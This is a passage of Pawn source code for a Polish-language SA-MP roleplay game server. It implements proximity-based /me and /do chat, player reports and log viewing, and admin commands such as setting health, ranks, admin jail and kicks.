						new msg[256]; format(msg, sizeof(msg), "Paczka ~r~~h~%d~n~~w~Adresat: ~r~~h~%s~n~~w~Punkt dostarczenia: %s", i, GroupCache[groupuid][gName], DoorCache[duid][dName]);
						PlayerTextDrawSetString(playerid, ObjectInfo[playerid], msg);
						PlayerTextDrawShow(playerid, ObjectInfo[playerid]);
						pMapIcon[playerid] = CreateDynamicMapIcon(DoorCache[duid][dOutX], DoorCache[duid][dOutY], DoorCache[duid][dOutZ], 0, COLOR_DARKRED, 0, 0, playerid, 60000, MAPICON_GLOBAL_CHECKPOINT);
						Streamer_Update(playerid);
					}
				}
				else
				{
					if(IsPlayerInRangeOfPoint(playerid, 2.5, DoorCache[duid][dOutX], DoorCache[duid][dOutY], DoorCache[duid][dOutZ]))
					{
						if(IsPlayerInAnyVehicle(playerid))
						GameTextForPlayer(playerid, "~r~~h~wysiadz z pojazdu!", 3000, 4);
						ItemCache[i][iState] = ITEM_STATE_PRODUCT;
						ItemCache[i][iOwner] = groupuid;
						ApplyAnimation(playerid, "BOMBER", "BOM_Plant", 4.1, 0, 0, 0, 0, 0, 0);
						new reward = random(100);
						new msg[128]; format(msg, sizeof(msg), "~w~paczka dostarczona!~n~~g~~h~+$%d", reward);
						GameTextForPlayer(playerid, msg, 3000, 4);
						PlayerTextDrawHide(playerid, ObjectInfo[playerid]);
						DestroyDynamicMapIcon(pMapIcon[playerid]);
						pMapIcon[playerid] = 0;
						pGetPack[playerid] = false;
					}
				}
			}
		}
	}*/
	new action[128];
	if(sscanf(params, "s[128]", action))
	{
		return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /me [czynnoœæ postaci]");
	}
	new msg[256]; format(msg, sizeof(msg), "** %s %s", strreplace(ReturnPlayerName(playerid), '_', ' '), action);
	new Float:X, Float:Y, Float:Z;
	GetPlayerPos(playerid, X, Y, Z);
	new vw = GetPlayerVirtualWorld(playerid);
	for(new i; i<=GetPlayerPoolSize(); i++)
	{
		if(IsPlayerConnected(i))
		{
			if(GetPlayerVirtualWorld(i) == vw)
			{
				if(IsPlayerInRangeOfPoint(i, 1.0, X, Y, Z))
				{
					if(strlen(msg) >= 64)
					{
						new temp1[256], temp2[256];
						temp1 = msg, temp2=msg;
						strdel(temp1, 64, strlen(temp1));
						strins(temp1, "...", strlen(temp1));
						strdel(temp2, 0, 64);
						strins(temp2, "...", 0);
						SendClientMessage(i, ME_SHADE_1, temp1);
						SendClientMessage(i, ME_SHADE_1, temp2);
						continue;
					}
					SendClientMessage(i, ME_SHADE_1, msg);
				}
				else if(IsPlayerInRangeOfPoint(i, 4.0, X, Y, Z))
				{
					if(strlen(msg) >= 64)
					{
						new temp1[256], temp2[256];
						temp1 = msg, temp2=msg;
						strdel(temp1, 64, strlen(temp1));
						strins(temp1, "...", strlen(temp1));
						strdel(temp2, 0, 64);
						strins(temp2, "...", 0);
						SendClientMessage(i, ME_SHADE_2, temp1);
						SendClientMessage(i, ME_SHADE_2, temp2);
						continue;
					}
					SendClientMessage(i, ME_SHADE_2, msg);
				}
				else if(IsPlayerInRangeOfPoint(i, 8.0, X, Y, Z))
				{
					if(strlen(msg) >= 64)
					{
						new temp1[256], temp2[256];
						temp1 = msg, temp2=msg;
						strdel(temp1, 64, strlen(temp1));
						strins(temp1, "...", strlen(temp1));
						strdel(temp2, 0, 64);
						strins(temp2, "...", 0);
						SendClientMessage(i, ME_SHADE_3, temp1);
						SendClientMessage(i, ME_SHADE_3, temp2);
						continue;
					}
					SendClientMessage(i, ME_SHADE_3, msg);
				}
				else if(IsPlayerInRangeOfPoint(i, 12.0, X, Y, Z))
				{
					if(strlen(msg) >= 256)
					{
						new temp1[256], temp2[256];
						temp1 = msg, temp2=msg;
						strdel(temp1, 64, strlen(temp1));
						strins(temp1, "...", strlen(temp1));
						strdel(temp2, 0, 64);
						strins(temp2, "...", 0);
						SendClientMessage(i, ME_SHADE_4, temp1);
						SendClientMessage(i, ME_SHADE_4, temp2);
						continue;
					}
					SendClientMessage(i, ME_SHADE_4, msg);
				}
				else if(IsPlayerInRangeOfPoint(i, 14.0, X, Y, Z))
				{
					if(strlen(msg) >= 64)
					{
						new temp1[256], temp2[256];
						temp1 = msg, temp2=msg;
						strdel(temp1, 64, strlen(temp1));
						strins(temp1, "...", strlen(temp1));
						strdel(temp2, 0, 64);
						strins(temp2, "...", 0);
						SendClientMessage(i, ME_SHADE_5, temp1);
						SendClientMessage(i, ME_SHADE_5, temp2);
						continue;
					}
					SendClientMessage(i, ME_SHADE_5, msg);
				}
				else if(IsPlayerInRangeOfPoint(i, 16.0, X, Y, Z))
				{
					if(strlen(msg) >= 64)
					{
						new temp1[256], temp2[256];
						temp1 = msg, temp2=msg;
						strdel(temp1, 64, strlen(temp1));
						strins(temp1, "...", strlen(temp1));
						strdel(temp2, 0, 64);
						strins(temp2, "...", 0);
						SendClientMessage(i, ME_SHADE_6, temp1);
						SendClientMessage(i, ME_SHADE_6, temp2);
						continue;
					}
					SendClientMessage(i, ME_SHADE_6, msg);
				}
			}
		}
	}
	if(pVal[playerid] == 1) // Buying vehicle register
	{
		new actoruid = pVal2[playerid];
		if(GetActorInRange(playerid) == actoruid)
		{
			format(msg, sizeof(msg), "%s mówi: Dziêkujê! "HEX_PURPLE"** zwróci³ dokumenty petentowi oraz poda³ mu rejestracjê pojazdu ** ", strreplace(ActorCache[actoruid][aName], '_', ' '));
			SendClientMessage(playerid, CHAT_SHADE_2, msg);
			pVal[playerid] = 0;
			PlayerTextDrawShow(playerid, RadarTextDraw[playerid]);
			return ShowPlayerDialog(playerid, D_BUY_REGISTER, DIALOG_STYLE_MSGBOX, "Oferta", "Kup "HEX_GREEN"rejestracjê pojazdu"HEX_WHITE" za "HEX_GREEN"$300.", "Kup", "Anuluj");
		}
	}
	if(ActionData[playerid][aType] == 2)
	{
		new auid = GetActorInRange(playerid);
		if(ActorCache[auid][aType] == 1)
		{
			ShowPlayerDialog(playerid, D_TRADE_3, DIALOG_STYLE_MSGBOX, "Oferta", "Wyrobienie dokumentu osobistego: "HEX_GREEN"$100"HEX_WHITE"\nCzy akceptujesz tê ofertê?", "Tak", "Nie");
		}
	}
	else if(ActionData[playerid][aType] == 1)
	{
		new auid = GetActorInRange(playerid);
		if(ActorCache[auid][aType] == 2)
		{
			format(msg, sizeof(msg), "%s mówi: Dziêkujê! *wpisuje dane w systemie oraz k³adzie dokumenty z powrotem na ladzie*", strreplace(ActorCache[auid][aName], '_', ' '));
			SendFormattedMessage(playerid, msg, "{AC79A7}", "{C8C8C8}", CHAT_SHADE_2);
			PlayerCache[playerid][pBankAccount] = true;
			format(msg, sizeof(msg), "Konto bankowe zosta³o otwarte. Numer konta: %d", PlayerCache[playerid][pUID]+300);
			ShowDialogInfo(playerid, msg);
			ActionData[playerid][aType] = 0;
		}
	}
	return 1;
}

cmd:do (playerid, params[])
{
	new action[128];
	if(sscanf(params, "s[128]", action))
	{
		SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /do [SZCZEGÓ£OWY OPIS POSTACI/OTOCZENIA]");
		return 1;
	}
	new msg[256];
	format(msg, sizeof(msg), "** %s (( %s ))", action, strreplace(ReturnPlayerName(playerid), '_', ' '));
	new Float:X, Float:Y, Float:Z;
	GetPlayerPos(playerid, X, Y, Z);
	new vw = GetPlayerVirtualWorld(playerid);
	for(new i; i<=GetPlayerPoolSize(); i++)
	{
		if(IsPlayerConnected(i))
		{
			if(GetPlayerVirtualWorld(i) == vw)
			{
				if(IsPlayerInRangeOfPoint(i, 1.0, X, Y, Z))
				{
					if(strlen(msg) >= 64)
					{
						new temp1[256], temp2[256];
						temp1 = msg, temp2=msg;
						strdel(temp1, 64, strlen(temp1));
						strins(temp1, "...", strlen(temp1));
						strdel(temp2, 0, 64);
						strins(temp2, "...", 0);
						SendClientMessage(i, DO_SHADE_1, temp1);
						SendClientMessage(i, DO_SHADE_1, temp2);
						continue;
					}
					SendClientMessage(i, DO_SHADE_1, msg);
				}
				else if(IsPlayerInRangeOfPoint(i, 4.0, X, Y, Z))
				{
					if(strlen(msg) >= 64)
					{
						new temp1[256], temp2[256];
						temp1 = msg, temp2=msg;
						strdel(temp1, 64, strlen(temp1));
						strins(temp1, "...", strlen(temp1));
						strdel(temp2, 0, 64);
						strins(temp2, "...", 0);
						SendClientMessage(i, DO_SHADE_2, temp1);
						SendClientMessage(i, DO_SHADE_2, temp2);
						continue;
					}
					SendClientMessage(i, DO_SHADE_2, msg);
				}
				else if(IsPlayerInRangeOfPoint(i, 8.0, X, Y, Z))
				{
					if(strlen(msg) >= 64)
					{
						new temp1[256], temp2[256];
						temp1 = msg, temp2=msg;
						strdel(temp1, 64, strlen(temp1));
						strins(temp1, "...", strlen(temp1));
						strdel(temp2, 0, 64);
						strins(temp2, "...", 0);
						SendClientMessage(i, DO_SHADE_3, temp1);
						SendClientMessage(i, DO_SHADE_3, temp2);
						continue;
					}
					SendClientMessage(i, DO_SHADE_3, msg);
				}
				else if(IsPlayerInRangeOfPoint(i, 12.0, X, Y, Z))
				{
					if(strlen(msg) >= 64)
					{
						new temp1[256], temp2[256];
						temp1 = msg, temp2=msg;
						strdel(temp1, 64, strlen(temp1));
						strins(temp1, "...", strlen(temp1));
						strdel(temp2, 0, 64);
						strins(temp2, "...", 0);
						SendClientMessage(i, DO_SHADE_4, temp1);
						SendClientMessage(i, DO_SHADE_4, temp2);
						continue;
					}
					SendClientMessage(i, DO_SHADE_4, msg);
				}
				else if(IsPlayerInRangeOfPoint(i, 14.0, X, Y, Z))
				{
					if(strlen(msg) >= 64)
					{
						new temp1[256], temp2[256];
						temp1 = msg, temp2=msg;
						strdel(temp1, 64, strlen(temp1));
						strins(temp1, "...", strlen(temp1));
						strdel(temp2, 0, 64);
						strins(temp2, "...", 0);
						SendClientMessage(i, DO_SHADE_5, temp1);
						SendClientMessage(i, DO_SHADE_5, temp2);
						continue;
					}
					SendClientMessage(i, DO_SHADE_5, msg);
				}
				else if(IsPlayerInRangeOfPoint(i, 16.0, X, Y, Z))
				{
					if(strlen(msg) >= 64)
					{
						new temp1[256], temp2[256];
						temp1 = msg, temp2=msg;
						strdel(temp1, 64, strlen(temp1));
						strins(temp1, "...", strlen(temp1));
						strdel(temp2, 0, 64);
						strins(temp2, "...", 0);
						SendClientMessage(i, DO_SHADE_6, temp1);
						SendClientMessage(i, DO_SHADE_6, temp2);
						continue;
					}
					SendClientMessage(i, DO_SHADE_6, msg);
				}
			}
		}
	}
	return 1;
}

stock PlayerFirstName(playerid)
{	
	new pname[MAX_PLAYER_NAME];
	GetPlayerName(playerid, pname, sizeof(pname));
	new pos = strfind(pname, "_", true);
	if(pos != -1)
	strdel(pname, pos, strlen(pname));
	return pname;
}

stock SendPlayerMe(playerid,  const action[])
{
	new str[256];
	format(str, sizeof(str), "* %s %s *", PlayerFirstName(playerid), action);
	SetPlayerChatBubble(playerid, str, ME_SHADE_1, 15.0, 5000);
	new copy_action[256];
	format(copy_action, sizeof(copy_action), action);
	format(str, sizeof(str), "%s %s", PlayerFirstName(playerid), ReplacePolishSymbols(copy_action));
	return TextDrawForPlayerEx(playerid, 3, str, 5000);
}

cmd:raport (playerid, params[])
{
	return callcmd::report(playerid, params);
}



forward ShowPlayerLogs(playerid, logType, targetUID);
public ShowPlayerLogs(playerid, logType, targetUID){
	if(dialogCache[playerid][dialogVal] == 0){
		new query[256];
		format(query, sizeof(query), "SELECT Max(uid) FROM playerLogs WHERE playerUID=%d LIMIT 1", targetUID);
		new Cache:cache = mysql_query(DB_HANDLE, query);
		cache_get_value_int(0, 0, dialogCache[playerid][dialogVal]);
		cache_delete(cache);
	}

	new query[1024];
	format(query, sizeof(query), "SELECT playerLogs.uid as logUID, playerLogs.message as message, playerLogs.createdAt as createdAt, players1.name as nick FROM playerLogs INNER JOIN players players1 ON players1.uid = playerLogs.playerUID AND playerLogs.uid <= %d AND playerUID=%d AND type = %d ORDER BY createdAt DESC LIMIT 10", dialogCache[playerid][dialogVal], targetUID, logType);
	new Cache:cache = mysql_query(DB_HANDLE, query);

	new rows = cache_num_rows();
	new message[256];

	new messagesList[2024];
	new dateTime[64];
	new nick[24];
	new uid=0;



	for(new i=0; i<rows; i++){
		cache_get_value_name(i, "message", message);
		
		cache_get_value_name(i, "createdAt", dateTime);
		cache_get_value_name(i, "nick", nick);
		cache_get_value_name_int(i, "logUID", uid);
		strdel(message, 100, strlen(message));	
		format(messagesList, sizeof(messagesList), "%s\n"HEX_BLACK"%d "HEX_BLUE"[%s] "HEX_GREEN"(kliknij tutaj aby rozwin¹æ tekst)\n%s", messagesList, uid, dateTime, message);
	}

	format(messagesList, sizeof(messagesList), "%s\n"HEX_BLACK"-1 %d\t"HEX_BLUE"Nastêpna strona", messagesList, targetUID);
	printf("logs: %d", rows);
	cache_delete(cache);


	if(rows == 10)
		dialogCache[playerid][dialogVal] = uid;

	format(message, sizeof(message), "Logi "HEX_BLUE"%s (strona %d)", nick, dialogCache[playerid][dialogVal]);
	ShowPlayerDialog(playerid, D_PLAYER_LOGS, DIALOG_STYLE_LIST, message, messagesList, "Zamknij", "");
	return 1;
}



cmd:logi (playerid, params[]){
	if(!PlayerCache[playerid][pLevel])
	return 1;
	new logType, targetid;
	if(sscanf(params, "ri", targetid, logType)){
		return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /logi [ID/Czêœæ nazwy gracza] [Typ logów w zakresie 0+]");
	}
	if(PlayerCache[targetid][pUID]<=0){
		return SendClientMessage(playerid, COLOR_GRAY, "Gracz nie jest zalogowany");
	}
	dialogCache[playerid][dialogVal] = 0;
	ShowPlayerLogs(playerid, logType, PlayerCache[targetid][pUID]);
	return 1;
}

cmd:report (playerid, params[])
{
	new targetid, reason[128];
	if(sscanf(params, "rs[128]", targetid, reason))
	{
		return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /report [ID/Czêœæ nazwy gracza] [treœæ]");
	}
	//if(playerid == targetid)
	//	return SendClientMessage(playerid, COLOR_GRAY, "Nie mo¿esz zreportowaæ samego siebie!");
	if(!IsPlayerConnected(targetid))
		return SendClientMessage(playerid, COLOR_GRAY, "Takiego gracza nie ma na serwerze.");
	if(!pLogged[targetid])
		return SendClientMessage(playerid, COLOR_GRAY, "Ten gracz nie jest zalogowany.");
	new queryReason[128];
	mysql_escape_string(reason, queryReason, sizeof(queryReason));



	new query[256];
	format(query, sizeof(query), "INSERT INTO playerReports(issuerUID, receiverUID, reason) VALUES (%d, %d, '%s')", PlayerCache[playerid][pUID], PlayerCache[targetid][pUID], queryReason);
	mysql_query(DB_HANDLE, query, false);



	new reportUID = 0;
	new Cache:cache = mysql_query(DB_HANDLE, "SELECT max(uid) FROM playerReports");
	cache_get_value_int(0, 0, reportUID);
	cache_delete(cache);

	new msg[128]; 
	format(msg, sizeof(msg), ""HEX_RED" Nowy raport #%d na gracza %s(%d). Utworzy³: %s(%d). U¿yj "HEX_WHITE"/reporty "HEX_RED" po wiêcej opcji",  reportUID, ReturnPlayerName(targetid), targetid, ReturnPlayerName(playerid), playerid);
	for(new i; i<=GetPlayerPoolSize(); i++)
	{
		if(IsPlayerConnected(i))
		{
			if(PlayerCache[i][pUID])
			{
				if(PlayerCache[i][pLevel] > 0)
				{
					SendClientMessage(i, -1, msg);
					SendClientMessage(i, COLOR_ORANGE, reason);
				}
			}
		}
	}

	ShowPlayerDialog(playerid, D_INFO, DIALOG_STYLE_MSGBOX, "Raport na gracza zosta³ wys³any.", ""HEX_RED"Nie powielaj raportów.\n\
	"HEX_DARKRED"Prêdzej czy póŸniej ekipa serwera zweryfikuje wys³ane zg³oszenie,\n\
	ka¿de jest sprawdzane i zapisywanie, jeœli jesteœ ofiar¹ i straci³eœ/aœ HP, przedmioty itp\n\
	 - nie martw siê, zadbamy o wszystko.\n\
	 Skorzystaj te¿ z szybkiej drogi komunikacji jeœli nikt z ekipy (/a) nie jest online.\n\
	 Discord lub nasze forum (mo¿esz napisaæ skargê).", "Rozumiem", "");
	

	
	return 1;
}
CMD:crash (playerid, params[]){

}
CMD:reporty(playerid, params[]){
	if(!PlayerCache[playerid][pLevel]){
	return;
	}
	new Cache:cache = mysql_query(DB_HANDLE, "SELECT players1.name as issuer, players2.name as receiver, createdAt, reason, playerReports.uid FROM playerReports INNER JOIN players players1 ON players1.uid = playerReports.issuerUID INNER JOIN players players2 ON players2.uid = playerReports.receiverUID;");
	new dialogContent[1024] = ""HEX_GREEN"#\tData\t\tZg³aszaj¹cy\tZg³oszony\tPowód\n";
	new rows = cache_num_rows();
	new issuer[24],
		receiver[24],
		reason[64], createdAt[32], uid=0;

	for(new i=0; i<rows; i++){
		cache_get_value_name(i, "issuer", issuer);
		cache_get_value_name(i, "receiver", receiver);
		cache_get_value_name(i, "reason", reason);
		cache_get_value_name(i, "createdAt", createdAt);
		cache_get_value_name_int(i, "uid", uid);
		format(dialogContent, sizeof(dialogContent), "%s\n%d\t"HEX_BLUE"%s\t"HEX_WHITE"%s\t"HEX_RED"%s\t"HEX_RED"%s",
		dialogContent, uid, createdAt, issuer, receiver, reason );
	}
	ShowPlayerDialog(playerid, D_PLAYER_REPORTS, DIALOG_STYLE_LIST, ""HEX_RED"Raporty na graczy", dialogContent, "Wybierz", "Anuluj");
	cache_delete(cache);
	return;
}

cmd:unbw (playerid, params[])
{
	if(PlayerCache[playerid][pLevel]  == 0)
	return 1;
	new targetid;
	if(sscanf(params, "r", targetid))
	{
		return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /unbw [ID/Czêœæ nazwy gracza]");
	}
	if(!IsPlayerConnected(targetid))
	{
		return SendClientMessage(playerid, COLOR_GRAY, "Ten gracz nie jest pod³¹czony do serwera.");
	}
	if(!pLogged[targetid])
	{
		return SendClientMessage(playerid, COLOR_GRAY, "Ten gracz jest niezalogowany.");
	}
	if(PlayerCache[targetid][pBW_Time] == 0)
	{
		return SendClientMessage(playerid, COLOR_GRAY, "Ten gracz nie ma BW.");
	}
	PlayerCache[targetid][pBW_Time] = 0;
	SetCameraBehindPlayer(targetid);
	TogglePlayerControllable(targetid, 1);
	if(!IsPlayerInAnyVehicle(targetid))
	ClearAnimations(targetid);
	UpdatePlayerName(targetid);
	HideTextDrawForPlayer(targetid, 2);
	new msg[64];
	format(msg, sizeof(msg), "%s œci¹n¹³ Ci BW.", ReturnPlayerName(playerid));
	SendClientMessage(targetid, COLOR_GRAY, msg);

	new query[64];
	format(query, sizeof(query), "UPDATE players SET bw_time = '0' WHERE uid = '%d'", PlayerCache[playerid][pUID]);
	mysql_query(DB_HANDLE, query);

	return 1;
}

cmd:joty (playerid, params[])
{
	if(PlayerCache[playerid][pLevel] < 2)
	{
		return 1;
	}
	new targetid, j;
	if(sscanf(params, "ri", targetid, j))
	{
		return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /joty [ID/Czêœæ nazwy gracza] [iloœæ]");
	}
	if(!IsPlayerConnected(targetid))
	{
		return SendClientMessage(playerid, COLOR_GRAY, "Gracz nie jest pod³¹czony do serwera.");
	}
	if(!pLogged[targetid])
	{
		return SendClientMessage(playerid, COLOR_GRAY, "Gracz nie jest zalogowany.");
	}
	PlayerCache[targetid][pStrenght] = j;
	UpdatePlayerName(targetid);
	new msg[128];
	format(msg, sizeof(msg), "%s zmieni³ twoj¹ wartoœæ Jotów na: %d", ReturnPlayerName(playerid), j);
	SendClientMessage(targetid, COLOR_GRAY, msg);
	format(msg, sizeof(msg), "Zmieni³ wartoœæ Jotów %s na: %d", ReturnPlayerName(targetid), j);
	SendClientMessage(playerid, COLOR_GRAY, msg);
	return 1;
}

cmd:hp (playerid, params[])
{
	if(PlayerCache[playerid][pLevel] == 0)
	{
		return 1;
	}
	new targetid, Float:HP;
	if(sscanf(params, "rf", targetid, HP))
	{
		return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /hp [ID/Czêœæ nazwy gracza] [iloœæ]");
	}
	if(!IsPlayerConnected(targetid))
	{
		return SendClientMessage(playerid, COLOR_GRAY, "Gracz nie jest pod³¹czony do serwera.");
	}
	if(!pLogged[targetid])
	{
		return SendClientMessage(playerid, COLOR_GRAY, "Gracz nie jest zalogowany.");
	}
	SetPlayerHealth(targetid, HP);
	PlayerCache[targetid][pHealth] = HP;

	new msg[128];

	format(msg, sizeof(msg), "UPDATE players SET health = '%f' WHERE uid = '%d'", HP, PlayerCache[playerid][pUID]);
	cache_delete(mysql_query(DB_HANDLE, msg));

	if(playerid == targetid)
	{
		format(msg, sizeof(msg), "Zmieni³eœ(aœ) swoj¹ wartoœæ HP na: %f", HP);
		SendClientMessage(playerid, COLOR_GRAY, msg);
	}
	else
	{
		format(msg, sizeof(msg), "%s zmieni³(a) twoj¹ wartoœæ HP na: %f", ReturnPlayerName(playerid), HP);
		SendClientMessage(targetid, COLOR_GRAY, msg);
		format(msg, sizeof(msg), "Zmieniono wartoœæ HP gracza %s na: %f", ReturnPlayerName(targetid), HP);
		SendClientMessage(playerid, COLOR_GRAY, msg);
	}
	return 1;
}

cmd:alevel (playerid, params[])
{
	if(PlayerCache[playerid][pLevel] < ADMINISTRATION)
	return 1;
	new targetid, rank;
	if(sscanf(params, "ri", targetid, rank))
	return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /alevel [ID/Czêœæ nazwy gracza] [ranga]");
	if(!IsPlayerConnected(targetid))
	return SendClientMessage(playerid, COLOR_GRAY, "Gracz nie jest pod³¹czony do serwera.");
	if(!pLogged[targetid])
	return SendClientMessage(playerid, COLOR_GRAY, "Gracz nie jest zalogowany.");
	if(rank == 0)
	aduty[targetid] = 0;
	PlayerCache[targetid][pLevel] = rank;
	UpdatePlayerName(targetid);
	new msg[128];
	format(msg, sizeof(msg), "%s zmieni³ Twój poziom rangi na: %d", ReturnPlayerName(playerid), rank);
	SendClientMessage(targetid, COLOR_GRAY, msg);
	format(msg, sizeof(msg), "Zmieni³ poziom rangi %s na: %d", ReturnPlayerName(targetid), rank);
	SendClientMessage(playerid, COLOR_GRAY, msg);
	return 1;
}

cmd:ac (playerid, params[])
{
	if(PlayerCache[playerid][pLevel] < ADMINISTRATION)
	return 1;
	new message[128];
	if(sscanf(params, "s[128]", message))
	{
		return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /ac [wiadomoœæ]");
	}
	new msg[256];
	format(msg, sizeof(msg), "< %d.%s: %s >", playerid, PlayerCache[playerid][pName], message);
	return SendMessageToAdmins(msg);
}

cmd:say (playerid, params[])
{
	if(PlayerCache[playerid][pLevel] < ADMINISTRATION)
	{
		return 1;
	}
	new text[128];
	if(sscanf(params, "s[128]", text))
	{
		return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /say [treœæ]");
	}
	new msg[256];
	format(msg, sizeof(msg), "[ %s: %s ]", ReturnPlayerName(playerid), text);
	SendClientMessageToAll(COLOR_PINK, msg);
	return 1;
}

new PenalityTimer;

stock KickPlayer(playerid, const adminname[], const reason[])
{
	if(!PlayerCache[playerid][pAJ_Time])
	{
		GetPlayerPos(playerid, PlayerCache[playerid][pPosX],  PlayerCache[playerid][pPosY],  PlayerCache[playerid][pPosZ]);
		PlayerCache[playerid][pPosVW] = GetPlayerVirtualWorld(playerid);
	}
	PlayerCache[playerid][pUID]=0;
	new str[128];
	format(str, sizeof(str), "~r~Kick~w~~n~Gracz: %s~n~Nadal: %s~n~~y~%s", ReturnPlayerName(playerid), adminname, reason);
	TextDrawSetString(PenalityTextDraw, str);
	TextDrawShowForAll(PenalityTextDraw);
	if(PenalityTimer > 0)
	{
		KillTimer(PenalityTimer);
	}
	PenalityTimer = SetTimer("HidePenalityTextDraw", 15000, false);
	format(str, sizeof(str), "> Otrzyma³eœ karê(kick) od %s. Powód: %s", adminname, reason);
	SendClientMessage(playerid, COLOR_RED, str);
	SetTimerEx("KickFix", 100, false, "i", playerid);
	return 1;
}

forward KickFix(playerid);
public KickFix(playerid)
{
	Kick(playerid);
}

forward HidePenalityTextDraw();
public HidePenalityTextDraw()
{
	TextDrawHideForAll(PenalityTextDraw);
	PenalityTimer = 0;
}

forward GetVehicleData(vehicleid, &model, &fuel, &Float:posX, &Float:posY, &Float:posZ, &Float:angle, &playerUID, &groupUID, &register, &color, &color2, &Float:health);
public GetVehicleData(vehicleid,  &model, &fuel, &Float:posX, &Float:posY, &Float:posZ, &Float:angle, &playerUID, &groupUID, &register, &color, &color2, &Float:health){
	new query[256];
	format(query, sizeof(query), "SELECT model, fuel, posX, posY, posZ, angle, IFNULL(playerUID, 0), IFNULL(groupUID, 0), register, color, color2, HP FROM vehicles WHERE gameId=%d LIMIT 1;", vehicleid);
	new Cache:cache = mysql_query(DB_HANDLE, query);
	cache_get_value_name_int(0, "model", model);
	cache_get_value_name_int(0, "playerUID", playerUID);
	cache_get_value_name_int(0, "groupUID", groupUID);
	cache_get_value_name_int(0, "fuel", fuel);
	cache_get_value_name_float(0, "posX", posX);
	cache_get_value_name_float(0, "posY", posY);
	cache_get_value_name_float(0, "posZ", posZ);
	cache_get_value_name_float(0, "angle", angle);
	cache_get_value_name_int(0, "register", register);
	cache_get_value_name_int(0, "color", color);
	cache_get_value_name_int(0, "color2", color2);
	cache_get_value_name_float(0, "HP", health);
	cache_delete(cache);
}

stock AJPlayer(playerid, const adminname[], const reason[], time)
{
	new str[128];
	format(str, sizeof(str), "~r~AdminJail~w~ (%d min)~n~Gracz: %s~n~Nadal: %s~n~~y~%s", time, ReturnPlayerName(playerid), adminname, reason);
	TextDrawSetString(PenalityTextDraw, str);
	TextDrawShowForAll(PenalityTextDraw);
	if(PenalityTimer > 0)
	{
		KillTimer(PenalityTimer);
	}
	PenalityTimer = SetTimer("HidePenalityTextDraw", 15000, false);
	format(str, sizeof(str), "> Otrzyma³eœ karê(AdminJail) od %s. Powód: %s", adminname, reason);
	SendClientMessage(playerid, COLOR_RED, str);
	if(!PlayerCache[playerid][pAJ_Time])
	{
		GetPlayerPos(playerid,PlayerCache[playerid][pPosX],PlayerCache[playerid][pPosY],PlayerCache[playerid][pPosZ]);
		PlayerCache[playerid][pPosVW] = GetPlayerVirtualWorld(playerid);
	}
	
	for(new i=0; i<=GetPlayerPoolSize();i++)
	{
		if(IsPlayerConnected(i))
		{
			if(PlayerCache[i][pUID])
			{
				if(GetPlayerVirtualWorld(i) == GetPlayerVirtualWorld(playerid))
				{
					SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(i)-1);
				}
			}
		}
	}
	SetPlayerAJPos(playerid);
	PlayerCache[playerid][pAJ_Time] = time;
	format(str, sizeof(str), "~r~~h~AdminJail: %dmin", PlayerCache[playerid][pAJ_Time]);
	PlayerTextDrawSetString(playerid, AJTextDraw[playerid], str);
	PlayerTextDrawShow(playerid, AJTextDraw[playerid]);

	format(str, sizeof(str), "UPDATE players SET aj_time = '%d' WHERE uid = '%d'", time, PlayerCache[playerid][pUID]);
	new Cache:cache = mysql_query(DB_HANDLE, str);
	cache_delete(cache);
	return 1;
}

stock BlockPlayer(playerid, adminname[], reason[])
{
	new str[128];
	format(str, sizeof(str), "~r~Blokada postaci~n~Gracz: %s~n~Nadal: %s~n~~y~%s", ReturnPlayerName(playerid), adminname, reason);
	TextDrawSetString(PenalityTextDraw, str);
	TextDrawShowForAll(PenalityTextDraw);
	if(PenalityTimer > 0)
	{
		KillTimer(PenalityTimer);
	}
	PenalityTimer = SetTimer("HidePenalityTextDraw", 15000, false);
	format(str, sizeof(str), "> Otrzyma³eœ/aœ karê(Blokada postaci) od %s. Powód: %s", adminname, reason);
	KickFix(playerid);
	PlayerCache[playerid][uBlock] = true;
	new breason[256]; format(breason, sizeof(breason), reason);
	PlayerCache[playerid][uBlockReason] = breason;
	return 1;
}

cmd:aj (playerid, params[])
{
	if(PlayerCache[playerid][pLevel] < SP_2)
	return 1;
	new targetid, reason[128], time;
	if(sscanf(params, "ris[128]", targetid, time, reason))
	return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /aj [ID/Czêœæ nazwy gracza] [czas] [powód]");
	/*if(playerid == targetid)
	return SendClientMessage(playerid, COLOR_GRAY, "Nie mo¿esz nadaæ sobie tej kary.");*/
	if(!IsPlayerConnected(targetid))
	return SendClientMessage(playerid, COLOR_GRAY, "Ten gracz nie jest pod³¹czony do serwera.");
	if(!pLogged[targetid])
	return SendClientMessage(playerid, COLOR_GRAY, "Ten gracz nie jest zalogowany.");
	if(time < 0 || time > 120)
	return SendClientMessage(playerid, COLOR_GRAY, "Czas AdminJail musi zmieœciæ siê pomiêdzy wartoœciami 0(by zdj¹æ AJ) - 120 min.");
	if(time == 0)
	{
		if(PlayerCache[targetid][pAJ_Time] == 0)
		return SendClientMessage(playerid, COLOR_GRAY, "Ten gracz nie posiada AJ.");

		PlayerCache[targetid][pAJ_Time] = 0;

		new query[128];
		format(query, sizeof(query), "UPDATE players SET aj_time = '0' WHERE uid = '%d'", PlayerCache[targetid][pUID]);
		mysql_query(DB_HANDLE, query);

		if(PlayerCache[targetid][pPosX] != 0 && PlayerCache[targetid][pPosY] != 0 && PlayerCache[targetid][pPosZ] != 0)
		{
			SetPlayerPos(targetid, PlayerCache[targetid][pPosX], PlayerCache[targetid][pPosY], PlayerCache[targetid][pPosZ]);
			SetPlayerVirtualWorld(targetid, PlayerCache[targetid][pPosVW]);
		}
		else if(PlayerCache[targetid][pHouseSpawn] != 0)
		{
			new duid = PlayerCache[targetid][pHouseSpawn];
			//SetPlayerPos(targetid, DoorCache[duid][dInsX], DoorCache[duid][dInsY], DoorCache[duid][dInsZ]);
			//SetPlayerVirtualWorld(targetid, DoorCache[duid][dInsVW]);
		}
